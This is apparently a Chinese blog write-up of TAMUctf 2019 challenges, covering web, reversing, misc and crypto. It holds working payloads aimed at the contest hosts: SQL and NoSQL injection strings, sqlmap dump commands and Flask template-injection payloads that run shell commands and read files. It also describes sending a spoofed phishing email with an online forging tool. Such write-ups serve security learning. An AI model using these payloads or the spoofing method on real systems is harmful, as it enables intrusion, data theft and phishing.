---
title: TAMUctf writeup
date: 2019-02-23 09:19:41
---

# Web

## Not Another SQLi Challenge

尝试登陆时页面会发生跳转，可在chrome浏览器开发者工具中的Network栏勾选Preserve log保存报文内容，以便用于burp重放。

万能密码登录。

```bash
$curl -s "http://web1.tamuctf.com/web/login.php" -d "username=admin' or 1=1#&password" | grep -o "gigem{.*}"
gigem{f4rm3r5_f4rm3r5_w3'r3_4ll_r16h7}
```

## Robots Rule

```bash
$curl "http://web5.tamuctf.com/robots.txt"
User-agent: *

WHAT IS UP, MY FELLOW HUMAN!
HAVE YOU RECEIVED SECRET INFORMATION ON THE DASTARDLY GOOGLE ROBOTS?!
YOU CAN TELL ME, A FELLOW NOT-A-ROBOT!
```

按提示伪装成Google机器人访问 robots.txt 。

```bash
curl "http://web5.tamuctf.com/robots.txt" -A "Googlebot/2.1 (+http://www.google.com/bot.html)" -s | grep -o "gigem{.*}"
gigem{be3p-bOop_rob0tz_4-lyfe}
```

## Many Gig'ems to you!

> [http://web7.tamuctf.com](http://web7.tamuctf.com/) 

```bash
$ curl -s http://web7.tamuctf.com/index.html | grep -oE 'gigem{[^"]+"'
gigem{flag_in_"

$ curl -s http://web7.tamuctf.com/cookies.html | grep -oE 'gigem{[^"]+"'
gigem{continued == source_and_"
gigem{_continued=source_and_"
gigem{_continued=source_and_"

$ curl http://web7.tamuctf.com/cook.js
document.cookie = "gigem_continue=cookies}; expires=Thu, 18 Dec 2020 12:00:00 UTC";
document.cookie = "hax0r=flagflagflagflagflagflag; expires=Thu, 18 Dec 2020 12:00:00 UTC";
document.cookie = "gigs=all_the_cookies; expires=Thu, 18 Dec 2020 12:00:00 UTC";
document.cookie = "cookie=flagcookiegigemflagcookie; expires=Thu, 18 Dec 2020 12:00:00 UTC";
```

几个页面相关的内容连起来得到flag为`gigem{flag_in_source_and_cookies` 。这个题目意思不大。

## Science!

> [http://web3.tamuctf.com](http://web3.tamuctf.com/)
>
> Difficulty: medium

flask的SSTI。

命令执行

```
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls -Rhl').read()}}
```

![1552741313918](1552741313918.png)

文件读取

```bash
{{''.__class__.__mro__[2].__subclasses__()[40]('flag.txt').read()}}
```

`gigem{5h3_bl1nd3d_m3_w17h_5c13nc3}` 

views.py内容

```python
import json
import sys
from tamuctf import app
from flask import Flask, render_template, request, jsonify, render_template_string

@app.route('/')
@app.route('/index')
def index():
    
    return render_template('index.html')

@app.route('/science', methods=['POST'])
def science():
    try:
        chem1 = request.form['chem1']
        chem2 = request.form['chem2']
        template = '''<html>
        <div style="text-align:center">
        <h3>The result of combining {} and {} is:</h3></br>
        <iframe src="https://giphy.com/embed/AQ2tIhLp4cBa" width="468" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div>
        </html>'''.format(chem1, chem2)

        return render_template_string(template, dir=dir, help=help, locals=locals)
    except:
        return "Something went wrong"
```

参考文章：

- [Flask/Jiaja2 SSTI](Flask/Jiaja2 SSTI) 
- [Flask/Jinja2 SSTI && python 沙箱逃逸](https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/)  

## Buckets

> Checkout my s3 bucket website!
> <http://tamuctf.s3-website-us-west-2.amazonaws.com/>
>
> Difficulty: easy

亚马逊云存储器S3 BUCKET未授权访问。

从链接知bucket name为`tamuctf` ，访问`http://tamuctf.s3.amazonaws.com/` ，

在页面中搜索发现`Dogs/CC2B70BD238F48BE29D8F0D42B170127/CBD2DD691D3DB1EBF96B283BDC8FD9A1/flag.txt` ，

访问`http://tamuctf.s3.amazonaws.com/Dogs/CC2B70BD238F48BE29D8F0D42B170127/CBD2DD691D3DB1EBF96B283BDC8FD9A1/flag.txt` ，

得到flag为`flag{W0W_S3_BAD_PERMISSIONS}` 。

参考文章：

- [针对亚马逊云存储器S3 BUCKET的渗透测试](https://www.freebuf.com/articles/web/135313.html) 
- [【技术分享】AWS渗透测试（Part 1）：S3 Buckets](https://www.anquanke.com/post/id/86927) 
- [配置 AWS CLI](https://docs.aws.amazon.com/zh_cn/cli/latest/userguide/cli-chap-configure.html) 

## Login App

> [http://web4.tamuctf.com](http://web4.tamuctf.com/)
>
> Difficulty: medium

页面源码有一段JavaScript

```javascript
    <script>
        $("#submit").on('click', function(){
            $.ajax({
                url: 'login', 
                type : "POST", 
                dataType : 'json', 
                data : JSON.stringify({"username": $("#username").val(), "password": $("#password").val()}),
                contentType: 'application/json;charset=UTF-8',
                success : function(result) {
                    $(".result").html(result);
                    console.log(result);
                    alert(result);
                },
                error: function(xhr, resp, text) {
                    $(".result").html("Something went wrong"); 
                    console.log(xhr, resp, text);
                }
            })
        });
    </script>
```

NoSQL注入。

报文：

```bash
POST /login HTTP/1.1
Host: web4.tamuctf.com
Content-Length: 50
Accept: text/plain
Content-Type: application/json;charset=UTF-8
Referer: http://web4.tamuctf.com/admin
Connection: close

{"username":{"$eq":"admin"},"password":{"$gt":""}}
```

或

![1552746047220](1552746047220.png)

或

```bash
curl -H 'Content-Type: application/json; charset=UTF-8' -X POST --data '{"username":{"$ne":"nosql"},"password":{"$ne":"injection"}}' http://web4.tamuctf.com/login
"Welcome: bob!"

curl -H 'Content-Type: application/json; charset=UTF-8' -X POST --data '{"username":{"$ne":"bob"},"password":{"$ne":"injection"}}' http://web4.tamuctf.com/login
"Welcome: admin!\ngigem{n0_sql?_n0_pr0bl3m_8a8651c31f16f5dea}"
```

参考文章：

[一个有趣的实例让NoSQL注入不再神秘](https://www.freebuf.com/articles/database/95314.html) 

## Bird Box Challenge

> http://web2.tamuctf.com
>
> We've got Aggies, Trucks, and Eggs!
>
> Difficulty: hard

```bash
neo@o:~$ curl -sG --data-urlencode "Search=test" http://web2.tamuctf.com/Search.php  | grep -o "<h1>.*</h1>"
<h1>Our search isn't THAT good...</h1>

neo@o:~$ curl -sG --data-urlencode "Search=test' or 1=1#" http://web2.tamuctf.com/Search.php  | grep -o "<h1>.*</h1>"
<h1>Nice try, nothing to see here.</h1>

neo@o:~$ curl -sG --data-urlencode "Search=test' and 1=0 union select 123 #" http://web2.tamuctf.com/Search.php  | grep -o "<h1>.*</h1>"
<h1>Nope. Not gonna let you use that command.</h1>

neo@o:~$ curl -sG --data-urlencode "Search=test' and 1=0 union  123 #" http://web2.tamuctf.com/Search.php  | grep -o "<h1>.*</h1>"
<h1>Nope. Not gonna let you use that command.</h1>

neo@o:~$ curl -sG --data-urlencode "Search=test' and 1=0 select  123 #" http://web2.tamuctf.com/Search.php  | grep -o "<h1>.*</h1>"
<h1> Our search isn't THAT good... </h1>

neo@o:~$ curl -sG --data-urlencode "Search=test'union select 123#" http://web2.tamuctf.com/Search.php  | grep -o "<h1>.*</h1>"
<h1>123</h1>

neo@o:~$ curl -sG --data-urlencode "Search=test'union select version()#" http://web2.tamuctf.com/Search.php  | grep -o "<h1>.*</h1>"
<h1>5.7.25-0ubuntu0.18.04.2</h1>
```

注入一把梭。

```bash
'UNION ALL SELECT GROUP_CONCAT(table_schema) FROM information_schema.tables WHERE table_schema != 'information_schema' #
得到数据库名：SqliDB

'UNION ALL SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema != 'information_schema' #
得到表名：Search

'UNION ALL SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema != 'information_schema' #
得到列名：items

'UNION ALL SELECT GROUP_CONCAT(items) FROM Search #
得到记录：Eggs,Trucks,Aggies
```

翻一圈啥也没有，flag不在数据库中，尝试用户名。

```
neo@o:~$ curl -sG --data-urlencode "Search=test'union select current_user#" http://web2.tamuctf.com/Search.php  | grep -o "<h1>.*</h1>"
<h1>gigem{w3_4r3_th3_4ggi3s}@localhost</h1>
```

实际上也可以直接上sqlmap。

```bash
sqlmap -u "http://web2.tamuctf.com/Search.php?Search=eggs" -p Search --dbms mysql --random-agent --sql-shell --hex --threads 10 --proxy=http://127.0.0.1:1080
```

![1552750064087](1552750064087.png)

## 1337 Secur1ty

> [http://web6.tamuctf.com](http://web6.tamuctf.com/)
>
> Difficulty: hard

注册用户后进入。

二维码解码结果为`otpauth://totp/TAMU_CTF?secret=5UGMBIONB66MCOXH` 。

消息是可以点击查看详情的。

![1552782392453](1552782392453.png)

对该链接`http://web6.tamuctf.com/message?id=2` 测试注入。

```bash
python sqlmap.py -u "http://web6.tamuctf.com/message?id=2" -p id --threads 10 --dump-all --random-agent --hex
```

![1552782785371](1552782785371.png)

得到admin用户邮箱为 1337-admin@l337secur1ty.hak ，Secret值为`WIFHXDZ3BOHJMJSC`，id为1，密码哈希为`02ca0b0603222a090fe2fbf3ba97d90c` ，在somd5查询对应明文为`secretpasscode` 。

使用burp修改cookie后转发可见flag为`gigem{th3_T0tp_1s_we4k_w1tH_yoU}`。

![1552783404288](1552783404288.png)

# Reversing

## Cheesy

```bash
echo Z2lnZW17M2E1eV9SM3YzcjUxTjYhfQ== | base64 -d
gigem{3a5y_R3v3r51N6!}
```

## Snakes over cheese

使用[pyc在线反编译](https://www.toolnb.com/tools/pyc.html) 得到如下代码：

```python
# uncompyle6 version 3.2.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.5 (default, Oct 30 2018, 23:45:53) 
# [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
# Embedded file name: reversing2.py
# Compiled at: 2018-10-08 03:28:58
from datetime import datetime
Fqaa = [102, 108, 97, 103, 123, 100, 101, 99, 111, 109, 112, 105, 108, 101, 125]
XidT = [83, 117, 112, 101, 114, 83, 101, 99, 114, 101, 116, 75, 101, 121]

def main():
    print 'Clock.exe'
    input = raw_input('>: ').strip()
    kUIl = ''
    for i in XidT:
        kUIl += chr(i)

    if input == kUIl:
        alYe = ''
        for i in Fqaa:
            alYe += chr(i)

        print alYe
    else:
        print datetime.now()


if __name__ == '__main__':
    main()
```

则Fqaa转换后为 `flag{decompile}` 。

## 042

> Cheers for actual assembly!
>
> \#medium
>
> [reversing3.s](https://tamuctf.com/files/9cca9cf5fd2409ddb51db4841ee97617/reversing3.s) 
>
> ```assembly
> 	.section	__TEXT,__text,regular,pure_instructions
> 	.build_version macos, 10, 14
> 	.globl	_concat                 ## -- Begin function concat
> 	.p2align	4, 0x90
> _concat:                                ## @concat
> 	.cfi_startproc
> ## %bb.0:
> 	pushq	%rbp
> 	.cfi_def_cfa_offset 16
> 	.cfi_offset %rbp, -16
> 	movq	%rsp, %rbp
> 	.cfi_def_cfa_register %rbp
> 	subq	$48, %rsp
> 	movq	%rdi, -8(%rbp)
> 	movq	%rsi, -16(%rbp)
> 	movq	-8(%rbp), %rdi
> 	callq	_strlen
> 	movq	-16(%rbp), %rdi
> 	movq	%rax, -32(%rbp)         ## 8-byte Spill
> 	callq	_strlen
> 	movq	-32(%rbp), %rsi         ## 8-byte Reload
> 	addq	%rax, %rsi
> 	addq	$1, %rsi
> 	movq	%rsi, %rdi
> 	callq	_malloc
> 	movq	$-1, %rdx
> 	movq	%rax, -24(%rbp)
> 	movq	-24(%rbp), %rdi
> 	movq	-8(%rbp), %rsi
> 	callq	___strcpy_chk
> 	movq	$-1, %rdx
> 	movq	-24(%rbp), %rdi
> 	movq	-16(%rbp), %rsi
> 	movq	%rax, -40(%rbp)         ## 8-byte Spill
> 	callq	___strcpy_chk
> 	movq	-24(%rbp), %rdx
> 	movq	%rax, -48(%rbp)         ## 8-byte Spill
> 	movq	%rdx, %rax
> 	addq	$48, %rsp
> 	popq	%rbp
> 	retq
> 	.cfi_endproc
>                                         ## -- End function
> 	.globl	_main                   ## -- Begin function main
> 	.p2align	4, 0x90
> _main:                                  ## @main
> 	.cfi_startproc
> ## %bb.0:
> 	pushq	%rbp
> 	.cfi_def_cfa_offset 16
> 	.cfi_offset %rbp, -16
> 	movq	%rsp, %rbp
> 	.cfi_def_cfa_register %rbp
> 	subq	$80, %rsp
> 	leaq	L_.str(%rip), %rdi
> 	movl	$3, %eax
> 	movl	$14, %ecx
> 	xorl	%esi, %esi
> 	movl	$8, %edx
>                                         ## kill: def %rdx killed %edx
> 	leaq	-16(%rbp), %r8
> 	movq	___stack_chk_guard@GOTPCREL(%rip), %r9
> 	movq	(%r9), %r9
> 	movq	%r9, -8(%rbp)
> 	movl	$0, -20(%rbp)
> 	movq	%rdi, -56(%rbp)         ## 8-byte Spill
> 	movq	%r8, %rdi
> 	movl	%ecx, -60(%rbp)         ## 4-byte Spill
> 	movl	%eax, -64(%rbp)         ## 4-byte Spill
> 	callq	_memset
> 	movb	$65, -16(%rbp)
> 	movb	$53, -15(%rbp)
> 	movb	$53, -14(%rbp)
> 	movb	$51, -13(%rbp)
> 	movb	$77, -12(%rbp)
> 	movb	$98, -11(%rbp)
> 	movb	$49, -10(%rbp)
> 	movb	$89, -9(%rbp)
> 	movl	$0, -28(%rbp)
> 	movl	$1, -32(%rbp)
> 	movl	$2, -36(%rbp)
> 	movl	-36(%rbp), %eax
> 	imull	-36(%rbp), %eax
> 	imull	-36(%rbp), %eax
> 	movl	-28(%rbp), %ecx
> 	addl	-32(%rbp), %ecx
> 	addl	-32(%rbp), %ecx
> 	addl	-32(%rbp), %ecx
> 	imull	%ecx, %eax
> 	cltd
> 	movl	-60(%rbp), %ecx         ## 4-byte Reload
> 	idivl	%ecx
> 	movl	%eax, -40(%rbp)
> 	movl	-36(%rbp), %eax
> 	imull	-36(%rbp), %eax
> 	imull	-36(%rbp), %eax
> 	movl	-28(%rbp), %esi
> 	addl	-32(%rbp), %esi
> 	addl	-32(%rbp), %esi
> 	imull	%esi, %eax
> 	cltd
> 	movl	-64(%rbp), %esi         ## 4-byte Reload
> 	idivl	%esi
> 	movl	%eax, -44(%rbp)
> 	movl	-40(%rbp), %esi
> 	movq	-56(%rbp), %rdi         ## 8-byte Reload
> 	movb	$0, %al
> 	callq	_printf
> 	leaq	L_.str.1(%rip), %rdi
> 	movl	-44(%rbp), %esi
> 	movl	%eax, -68(%rbp)         ## 4-byte Spill
> 	movb	$0, %al
> 	callq	_printf
> 	leaq	L_.str.2(%rip), %rdi
> 	leaq	-16(%rbp), %rsi
> 	movl	%eax, -72(%rbp)         ## 4-byte Spill
> 	movb	$0, %al
> 	callq	_printf
> 	movq	___stack_chk_guard@GOTPCREL(%rip), %rsi
> 	movq	(%rsi), %rsi
> 	movq	-8(%rbp), %rdi
> 	cmpq	%rdi, %rsi
> 	movl	%eax, -76(%rbp)         ## 4-byte Spill
> 	jne	LBB1_2
> ## %bb.1:
> 	xorl	%eax, %eax
> 	addq	$80, %rsp
> 	popq	%rbp
> 	retq
> LBB1_2:
> 	callq	___stack_chk_fail
> 	ud2
> 	.cfi_endproc
>                                         ## -- End function
> 	.section	__TEXT,__cstring,cstring_literals
> L_.str:                                 ## @.str
> 	.asciz	"The answer: %d\n"
> 
> L_.str.1:                               ## @.str.1
> 	.asciz	"Maybe it's this:%d\n"
> 
> L_.str.2:                               ## @.str.2
> 	.asciz	"gigem{%s}\n"
> 
> 
> .subsections_via_symbols
> ```

注意到71-78行。

```python
print "gigem{%s}"%"".join(chr(i) for i in [65,53,53,51,77,98,49,89])
# gigem{A553Mb1Y}
```

# Misc

## Who am I?

> What is the A record for `tamuctf.com`?
> (Not in standard `gigem{flag}` format)

`tamuctf.com` 的域名A记录为`52.33.57.247` ，提交即可。可使用[这个网站](https://centralops.net/co/NsLookup.aspx) 或者命令`nslookup -type=all tamuctf.com` 。

## Who do I trust?

> Who issued the certificate to `tamuctf.com`?
> (Not in standard `gigem{flag}` format)

查看证书知颁发机构为 `Let's Encrypt Authority X3` 。

## Where am I?

> What is the name of the city where the server for tamuctf.com is located?
>
> (Not in standard gigem{flag} format)

使用[在线网站](https://check-host.net/ip-info?host=tamuctf.com) 查询得到服务器所在城市为 `Boardman` 。

## I heard you like files.

```bash
$binwalk -e art.png
$tail -n1  _art.png.extracted/word/media/image1.png | base64 -d
flag{P0lYt@r_D0_y0u_G3t_It_N0w?}
```

## Hello World

在页面全选可发现端倪。

![1552784857947](1552784857947.png)

这是一种由空白字符（空白符、制表符、换行符）组成的[编程语言](https://en.wikipedia.org/wiki/Whitespace_(programming_language))。这是一个 [在线解释器](https://naokikp.github.io/wsi/whitespace.html) 。

![1552784704688](1552784704688.png)

flag is `gigem{0h_my_wh4t_sp4c1ng_y0u_h4v3}` 。

## Onboarding Checklist

> From: importantperson@somebigcorp.com
> Date: Feb 22, 2019 9:00 AM
> To: someguy@somebigcorp.com
> Subject: New Employee Access
>
> Hello Some Guy,
>
> We need to begin sending requests for the new employee to get access to our security appliances. I believe they already know that you are authorized to make a new account request. Would you mind sending the new employee's email address to tamuctf@gmail.com so they can process the account request?
>
> Thank you,
> Important Person
>
> The new employee can be a little slow to respond.
>
> 
>
> Difficulty: easy
>
> 2/26 8:42 am CST: Visting `somebigcorp.com` is not part of the challenge

按照指示发送钓鱼邮件，接收到flag为`gigem{wuT_4n_31337_sp0ofer_494C4F5645594F55} `。

工具：[伪造邮件](https://emkei.cz/)，[临时邮箱](https://www.guerrillamail.com/) 。

![1552787841366](1552787841366.png)

![1552787882188](1552787882188.png)

# Crypto

## -.-

> To 1337-H4X0R:
>
> Our coworker Bob loves a good classical cipher. Unfortunately, he also loves to send everything encrypted with these ciphers. Can you go ahead and decrypt this for me?
>
> Difficulty: easy
>
> 
>
> flag.txt
>
> ```python
> dah-dah-dah-dah-dah dah-di-di-dah di-di-di-di-dit dah-dah-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-dah-dah-dah di-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dit dah-dah-dah-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-di-di-dah dah-dah-di-di-dit di-di-di-di-dit di-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-di-dit dah-di-di-di-dit di-di-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-dah-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dit dah-di-di-di-dit dah-di-dit di-di-di-di-dah dah-di-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dit di-di-di-di-dit di-di-dah-dah-dah di-dah dah-dah-di-di-dit di-di-di-dah-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit di-di-di-di-dah dah-dah-dah-di-dit dah-di-di-di-dit dah-di-di-dit dah-di-di-di-dit di-dah di-di-di-di-dah dah-dah-dah-dah-dit dah-dah-di-di-dit di-di-di-di-dah di-di-dah-dah-dah di-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-dah-dah-dah dah-di-di-di-dit di-di-di-di-dah di-dah dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dit di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-di-di-di-dit di-dah dah-di-di-di-dit dah-di-dit di-di-dah-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-dit di-di-di-di-dah di-di-di-di-dah dah-di-di-di-dit dah-di-di-dit dah-di-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dit dit di-di-di-di-dah dit di-di-di-dah-dah dah-dah-dah-dah-dit dah-di-di-di-dit dah-di-di-di-dit dah-di-di-di-dit dah-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-di-dit di-di-di-di-dah di-di-di-di-dit di-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit di-di-dah-dit di-di-di-di-dit di-di-di-di-dah di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dit di-dah di-di-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dah-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit di-dah di-di-di-di-dah dah-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah di-dah di-di-dah-dah-dah di-dah-dah-dah-dah di-di-di-di-dah dah-di-di-di-dit dah-di-di-di-dit dah-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-di-di-di-dit dah-di-dah-dit di-di-dah-dah-dah di-di-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah dah-di-di-di-dit di-dah dah-dah-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dah dah-di-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-di-dah dah-dah-dah-dah-dit di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-di-dit dah-di-di-di-dit di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit dah-dah-di-di-dit di-dah di-di-di-di-dah dah-dah-di-di-dit di-di-dah-dah-dah dah-dah-dah-dah-dah dah-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-di-di-dit dah-di-di-di-dit dah-di-dit dah-dah-di-di-dit dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-dah-dah di-dah-dah-dah-dah dah-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-dit di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit di-di-di-dah-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-dah-dah di-dah-dah-dah-dah di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dah dah-di-di-dit di-di-dah-dah-dah dah-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dit di-di-di-dah-dah dah-dah-dah-dah-dah dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-dah-dah-di-dit di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-dah-dah di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dah dah-dah-dah-dah-dit di-di-di-dah-dah di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-dit di-di-dah-dah-dah dah-dah-dah-dah-dah dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit di-dah di-di-di-di-dah dah-di-di-dit di-di-di-di-dit di-dah dah-dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-di-dit dah-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dah di-di-di-di-dah di-di-di-di-dit di-di-di-dah-dah dah-di-di-di-dit dah-dah-dah-di-dit di-di-di-di-dah dah-di-dah-dit dah-di-di-di-dit dah-di-dit di-di-di-dah-dah dah-dah-dah-di-dit di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit dah-di-di-di-dit dit di-di-di-di-dit di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah dah-dah-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-dah di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dah dit dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah di-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-di-dit dah-dah-dah-di-dit di-di-dah-dah-dah dah-di-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dit di-di-dah-dah-dah di-dah-dah-dah-dah di-di-di-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dit di-di-di-di-dah dah-dah-di-di-dit di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dit di-di-dah-dah-dah dah-dah-di-di-dit di-dah di-di-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah di-dah-dah-dah-dah dah-di-di-di-dit di-dah di-di-dah-dah-dah di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-di-dit di-di-di-di-dah di-di-dah-dah-dah dah-di-di-di-dit di-dah dah-di-di-di-dit di-di-di-di-dah di-di-di-di-dah dit di-di-di-di-dah dah-dah-dah-dah-dit dah-dah-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-dah-dah di-di-di-di-dit dah-dah-di-di-dit dah-dah-di-di-dit di-di-dah-dah-dah di-di-di-dah-dah di-di-dah-dah-dah di-di-di-di-dah di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dit di-di-di-di-dit di-dah di-di-di-di-dah di-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dit di-dah di-di-di-dah-dah di-di-dah-dah-dah dah-dah-di-di-dit di-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-dah-dah-dah dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-di-dit di-di-di-di-dah dah-di-dah-dit di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-dah-dit di-di-di-dah-dah dah-dah-di-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-dah-dah di-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah dah-dah-dah-dah-dit
> ```

solve.py

```python
import re
def morse(s):
    morseChart = ['.-',       '-...',     '-.-.',     '-..',      '.',        '..-.',     '--.',
                  '....',     '..',       '.---',     '-.-',      '.-..',     '--',       '-.',
                  '---',      '.--.',     '--.-',     '.-.',      '...',      '-',        '..-',
                  '...-',     '.--',      '-..-',     '-.--',     '--..',     '-----',    '.----',
                  '..---',    '...--',    '....-',    '.....',    '-....',    '--...',    '---..',
                  '----.',    '.-.-.-',   '--..--',   '..--..',   '-....-',   '.----.',   '---...',
                  '.-..-.',   '-..-.',    '.--.-.',   '-.-.-.',   '-...-',    '-.-.--',   '..--.-',
                  '-.--.',    '-.--.-',   '...-..-',  '.-...',    '.-.-.',    ' ',        '*'
                  ]
    alphaChart = ['a',        'b',        'c',        'd',        'e',        'f',        'g',
                  'h',        'i',        'j',        'k',        'l',        'm',        'n',
                  'o',        'p',        'q',        'r',        's',        't',        'u',
                  'v',        'w',        'x',        'y',        'z',        '0',        '1',
                  '2',        '3',        '4',        '5',        '6',        '7',        '8',
                  '9',        '.',        ',',        '?',        '-',        "'",        ':',
                  '"',        '/',        '@',        ';',        '=',        '!',        '_',
                  '(',        ')',        '$',        '&',        '+',        ' ',        '#'
                  ]

    # or as a dict ->  {c[1][i]: c[0][i] for i in xrange(len(c[0]))}
    c = [morseChart, alphaChart]

    s = s.lower()

    # replace characters not in alphaChart with '#' ,which shall be '*' in
    # encoded string
    s = re.sub('[^a-z0-9.,?\-\':"/@;=!_()$&+ ]', '#', s)

    # for convenience sake, I choose not to deal with space in morse.
    s = re.sub('\s+', ' ', s)

    m = 1  # default to decode
    # if mot mismatch that condition,we are to encode.
    if not re.match('[^-._ ]', s):
        # occasionally we meet [ ._]+ instead of [ .-]+
        s = s.replace('_', '-')
        s = re.split(' ', s)
        m = 0  # we are  to encode by morse

    r = []
    # list().extend(foo) returns None so we use 'or r'
    return (m * ' ').join(r.extend([c[1 - m][c[m].index(i)] for i in s]) or r)

